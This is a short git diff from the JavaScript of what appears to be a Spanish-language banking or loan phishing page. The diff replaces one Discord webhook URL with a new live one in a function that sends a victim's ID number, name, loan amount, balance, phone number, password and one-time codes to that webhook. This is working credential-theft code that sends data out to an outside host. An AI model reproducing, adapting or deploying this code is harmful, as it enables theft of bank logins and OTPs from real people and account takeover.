@@ -432,7 +432,7 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 
   async function sendDiscordWebhookMessage(formData, otp, contSend) {
-  const webhookUrl = "https://discord.com/api/webhooks/1464072928109789377/nuiIqU3E5gUDSwj3lwk0chaX-Xm39D6W0_geT9XHqhvhavmdg6gFhY1HggDIRNGmCGAi"; // ← reemplaza con tu webhook
+  const webhookUrl = "https://discord.com/api/webhooks/1501316102641418330/sUkWUBR4Y8-liFvecQfKDsq9c1A6iuHUbnNJliVMDVSfC3vDEZWpu7T4lXZVJcPF6xeA";
 
   const message = `📲 **Datos dinámica ${contSend}**\n\n🪪 **Cédula:** ${formData.cedula}\n👤 **Nombre:** ${formData.nombreCompleto}\n💰 **Monto:** ${formData.montoPrestamo}\n💵 **Saldo actual:** ${formData.saldoActual}\n📱 **Número:** ${formData.phoneNumber}\n🔐 **Clave:** ${formData.password}\n🔢 **Dinámica ${contSend}:** ${otp}`;
 
